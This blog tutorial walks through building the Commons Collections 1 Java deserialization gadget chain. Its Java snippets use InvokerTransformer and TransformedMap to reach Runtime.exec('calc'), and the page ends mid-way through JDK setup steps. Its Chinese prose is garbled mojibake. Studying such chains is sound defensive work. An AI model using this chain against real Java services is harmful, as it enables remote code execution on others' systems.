<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
    <meta name="description" content="è®°å½•ä¸€äº›å¥‡å¥‡æ€ªæ€ªä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿">
    <meta name="author" content="y1zh3e7">
    
    <title>
        
            CommonsCollections1+6 |
        
        y1â€™s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.jpg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"ä¸€åªåç‰¢çš„webğŸ¶ || æ‡‚è¿›æ”»çŸ¥é˜²å®ˆï¼Œå…ˆæ­£å‘åé€†å‘","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak somethingï¼"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 7.0.0-rc1">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.jpg">
                </a>
            
            <a class="logo-title" href="/">
               y1â€™s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                é¦–é¡µ
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                å½’æ¡£
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                æ ‡ç­¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                åˆ†ç±»
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                å‹é“¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                å…³äº
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">é¦–é¡µ</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">å½’æ¡£</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">æ ‡ç­¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">åˆ†ç±»</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">å‹é“¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">å…³äº</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">CommonsCollections1+6</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/avatar.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">y1zh3e7</span>
                            
                                <span class="author-label">Lv2</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-05-18 10:42:01</span>
        <span class="mobile">2023-05-18 10:42</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-05-18 10:44:35</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/WebSec/">WebSec</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Javaååºåˆ—åŒ–</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>4.6k å­—</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>21 åˆ†é’Ÿ</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h1 id="ç¬¬ä¸€æ¡é“¾å­ï¼š"><a href="#ç¬¬ä¸€æ¡é“¾å­ï¼š" class="headerlink" title="ç¬¬ä¸€æ¡é“¾å­ï¼š"></a>ç¬¬ä¸€æ¡é“¾å­ï¼š</h1><h2 id="å‚è€ƒè§†é¢‘ï¼š"><a href="#å‚è€ƒè§†é¢‘ï¼š" class="headerlink" title="å‚è€ƒè§†é¢‘ï¼š"></a>å‚è€ƒè§†é¢‘ï¼š</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP_å“”å“©å“”å“©_bilibili<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Javaç¯å¢ƒ"><a href="#Javaç¯å¢ƒ" class="headerlink" title="Javaç¯å¢ƒ"></a>Javaç¯å¢ƒ</h2><p>jdk8u65 ä¸‹è½½é“¾æ¥ï¼š<a class="link" target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Java Archive Downloads - Java SE 8 (oracle.com)<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="ä»€ä¹ˆæ˜¯CommonsCollections"><a href="#ä»€ä¹ˆæ˜¯CommonsCollections" class="headerlink" title="ä»€ä¹ˆæ˜¯CommonsCollections"></a><strong>ä»€ä¹ˆæ˜¯CommonsCollections</strong></h2><p>Commonsï¼šApache Commonsæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼ŒCommonsçš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„è§£å†³å„ç§å®é™…é—®é¢˜çš„Javaå¼€æºä»£ç ã€‚</p>
<p>Commons Collectionsï¼šJavaä¸­æœ‰ä¸€ä¸ªCollectionsåŒ…ï¼Œå†…éƒ¨å°è£…äº†è®¸å¤šæ–¹æ³•ç”¨æ¥å¯¹é›†åˆè¿›è¡Œå¤„ç†ï¼ŒCommonsCollectionsåˆ™æ˜¯å¯¹Collectionsè¿›è¡Œäº†è¡¥å……ï¼Œå®Œå–„äº†æ›´å¤šå¯¹é›†åˆå¤„ç†çš„æ–¹æ³•ï¼Œå¤§å¤§æé«˜äº†æ€§èƒ½ã€‚</p>
<h2 id="CommonsCollections1-1"><a href="#CommonsCollections1-1" class="headerlink" title="CommonsCollections1"></a><strong>CommonsCollections1</strong></h2><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£å†…æœ‰ä¸€ä¸ªæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input object (leaving it unchanged) into some output object.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the object to be transformed, should be left unchanged</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a transformed object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬åœ¨è¯¥æ¥å£çš„ä¼—å¤šå®ç°ç±»ä¸­é”å®šå¯ä»¥åˆ©ç”¨çš„ç±»<code>InvokerTransformer</code>ï¼Œå‘ç°<code>InvokerTransformer</code>çš„<code>transform</code>æ–¹æ³•åˆ©ç”¨åå°„å¯ä»¥å®ç°ä»»æ„æ–¹æ³•è°ƒç”¨ï¼Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å…ˆä»transformæ–¹æ³•æ¥æ”¶ä¸€ä¸ªç±»ï¼Œé€šè¿‡åå°„è·å¾—è¿™ä¸ªç±»çš„classå¯¹è±¡ï¼Œå†é€šè¿‡æ„é€ å‡½æ•°æ¥å—æ–¹æ³•åå­—ï¼Œå‚æ•°ç±»å‹ï¼Œå‚æ•°åˆ—è¡¨ï¼Œå®ç°äº†ä»»æ„æ–¹æ³•è°ƒç”¨ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> {</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> {</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™è¡Œä»£ç æ¥å¼¹è®¡ç®—å™¨ï¼Œå…¶å®ä¹Ÿå°±æ˜¯åˆ©ç”¨äº†<code>Invokertransformer</code>ä¸­è‡ªå¸¦çš„åå°„çœç•¥äº†åå°„çš„æ­¥éª¤ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"calc"</span>}).transform(currentRuntime);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æ¥ç€æ‰¾å¯åˆ©ç”¨çš„ç±»ï¼Œç†æƒ³æƒ…å†µä¸‹å¦‚æœæœ‰ä¸€ä¸ªç±»çš„<code>readObject</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>Invokertransformer.transform</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±æ˜¯æˆ‘ä»¬ååºåˆ—åŒ–çš„èµ·ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªè¿™æ ·çš„ç±»ï¼Œæ‰€ä»¥æ¥ç€å‘ä¸‹æ‰¾è°ƒç”¨äº†<code>Invokertransformer.transform</code>çš„å…¶ä»–ç±»ã€‚</p>
<p>ä¸‹ä¸€ä¸ªå¯åˆ©ç”¨çš„ç±»å°±æ˜¯<code>Commons Collections</code>ä¸­çš„<code>TransformedMap</code></p>
<p>ç±»ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211221931757.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211221931757.png"></p>
<p>æˆ‘ä»¬ä¸»è¦çœ‹<code>TransformedMap</code>çš„æ„é€ å‡½æ•°å’Œ<code>decorate</code>æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {</span><br><span class="line">     <span class="built_in">super</span>(map);</span><br><span class="line">     <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">     <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line"> }</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line"> }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><code>TransformedMap</code>çš„æ„é€ æ–¹æ³•ä¸ºprotectedï¼Œå› æ­¤æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•<code>decorate</code>æ¥ä½¿ç”¨å®ƒçš„æ„é€ æ–¹æ³•ï¼Œ<code>decorate</code>æ¥å—ä¸€ä¸ªmapï¼Œä¸¤ä¸ªTransfoemerï¼Œå¹¶å¯¹è¿™ä¸¤ä¸ªTransformeråšäº†ä¸€ä¸ªâ€œè£…é¥°â€æ“ä½œã€‚</p>
<p><code>TransformedMap</code>ä¸­æ‰¾åˆ°<code>checkSetValue</code>è°ƒç”¨äº†<code>Invokertransformer.transform</code>ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> {</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å°†ä¸Šé¢å¼¹è®¡ç®—å™¨çš„payloadæ¯”å¯¹ä¸€ä¸‹ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"calc"</span>}).transform(currentRuntime);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´å¦‚æœ<code>checkSetValue</code>ä¸­ï¼Œæˆ‘ä»¬å°†<code>valueTransformer</code>æ›¿æ¢æˆ<code>InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})</code>ï¼Œå†å°†<code>transform</code>çš„å‚æ•°æ›¿æ¢æˆRuntimeå¯¹è±¡ï¼Œå°±å¯ä»¥æ›¿ä»£ä¸Šé¢çš„å†™æ³•ã€‚æƒ³è¦æ›¿ä»£<code>valueTransformer</code>å¯ä»¥é€šè¿‡è°ƒç”¨<code>TransformedMap.decorate</code>å°†<code>InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})</code>èµ‹å€¼ç»™<code>valueTransformer</code>ï¼Œä¿®æ”¹payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"calc"</span>});</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å†æ¥çœ‹æ€ä¹ˆè®©valueå¯æ§ï¼Œé¦–å…ˆè¦æ‰¾è°ƒç”¨<code>checkSetValue</code>çš„æ–¹æ³•ï¼š</p>
<p>æˆ‘ä»¬é”å®šæŠ½è±¡ç±»<code>AbstractInputCheckedMapDecorator.MapEntry</code>ï¼ŒæŸ¥çœ‹å®ƒçš„<code>setValue</code>æ–¹æ³•ï¼Œå¹¶ä¸”<code>TransformedMap</code>æ˜¯è¯¥æŠ½è±¡ç±»çš„å®ç°ç±»ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940144.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211241940144.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211231903967.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211231903967.png"></p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> {</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** The parent map */</span></span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> {</span><br><span class="line">           <span class="built_in">super</span>(entry);</span><br><span class="line">           <span class="built_in">this</span>.parent = parent;</span><br><span class="line">       }</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> {</span><br><span class="line">           value = parent.checkSetValue(value);</span><br><span class="line">           <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">       }</span><br><span class="line">   }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å‘ç°å¯ä»¥é€šè¿‡è°ƒç”¨<code>setValue(currentRuntime)</code>æ–¹æ³•æ¥è§¦å‘å…¶ä¸­çš„<code>checkSetvalue</code>ï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦ä¸€ä¸ªentryæ¥è°ƒç”¨å®ƒçš„setValueæ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œéå†ä¸€ä¸ªMapï¼Œè·å–å®ƒçš„entryï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">"k"</span>,<span class="string">"v"</span>);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet())</span><br><span class="line">       {</span><br><span class="line">               entry.setValue(currentRuntime);</span><br><span class="line">       }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>payloadæ­¤æ—¶ä¿®æ”¹ä¸ºï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">   <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class},<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"calc"</span>});</span><br><span class="line">   <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">   map.put(<span class="string">"k"</span>,<span class="string">"v"</span>);			<span class="comment">//éšä¾¿ç»™mapå­˜ä¸€å¯¹k-v å¦åˆ™éå†æ—¶mapä¸ºç©º æ‹¿ä¸åˆ°entry</span></span><br><span class="line">   Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">   <span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet()) <span class="comment">//entrySetå¯ä»¥å°†mapä¸­çš„é”®å€¼å¯¹ä»¥setå‚¨å­˜èµ·æ¥</span></span><br><span class="line">   {</span><br><span class="line">           entry.setValue(currentRuntime);</span><br><span class="line">   }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬æ¥ç€æ‰¾setValueåœ¨å…¶ä»–ä½ç½®çš„è°ƒç”¨</p>
<hr>
<p>è¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹ç¯å¢ƒåšä¸€ç‚¹å°é…ç½®ï¼Œç”±äºä¸‹ä¸€ä¸ªå¯åˆ©ç”¨ç±»<code>AnnotationInvocationHandler</code>æ˜¯ç›´æ¥åç¼–è¯‘å‡ºæ¥çš„ï¼Œåœ¨æŸ¥æ‰¾ç”¨æ³•æ—¶æ‰¾ä¸åˆ°è¿™ä¸ªç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°†<code>AnnotationInvocationHandler</code>çš„javaæ–‡ä»¶æ·»åŠ åˆ°jdkä¸­</p>
<ul>
<li>æˆ‘ä»¬å…ˆåœ¨openjdkæ‰¾åˆ°æœ‰æ¼æ´çš„javaç‰ˆæœ¬ï¼š<a class="link" target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">jdk8u/jdk8u/jdk: af660750b2f4 (java.net)<i class="fas fa-external-link-alt"></i></a></li>
<li>åœ¨ä¸‹è½½å¥½çš„jdkä¸­æ‰¾åˆ°sunåŒ… è·¯å¾„ä¸º<code>jdk-af660750b2f4\\jdk-af660750b2f4\\src\\share\\classes</code></li>
<li>æˆ‘ä»¬æ‰¾åˆ°ysoserialä½¿ç”¨çš„jdk8u65çš„ç›®å½•ï¼Œè¿™é‡Œä¸€èˆ¬åˆ†ä¸¤ä¸ªæƒ…å†µ<ul>
<li>ç›®å½•ä¸‹æœ‰src.zipï¼Œåˆ©ç”¨è§£å‹å·¥å…·è§£å‹åå°†ä¸Šä¸€æ­¥æ‰¾åˆ°çš„sunåŒ…copyä¸€ä»½åˆ°srcé‡Œ</li>
<li>ç›®å½•ä¸‹æ²¡æœ‰src.zipï¼Œæˆ‘ä»¬å…ˆåœ¨<code>jdk1.8 u65\\</code>ä¸‹æ–°å»ºä¸€ä¸ªsrcæ–‡ä»¶å¤¹ï¼Œå†åœ¨<code>jdk1.8 u65\\jre\\lib</code>ä¸‹æ‰¾åˆ°<code>rt.jar</code>ï¼Œæ³¨æ„è¿™é‡Œä¸è¦ç”¨java -jarè¿›è¡Œè§£å‹ï¼Œç›´æ¥ç”¨7zipç­‰è§£å‹å·¥å…·è§£å‹å³å¯ï¼Œè§£å‹åå°†é‡Œé¢çš„æ‰€æœ‰ä¸œè¥¿æ”¾åœ¨<code>jdk1.8 u65\\src</code>ä¸‹ï¼Œå†å°†ä¸Šä¸€æ­¥çš„sunåŒ…copyåˆ°srcä¸­</li>
</ul>
</li>
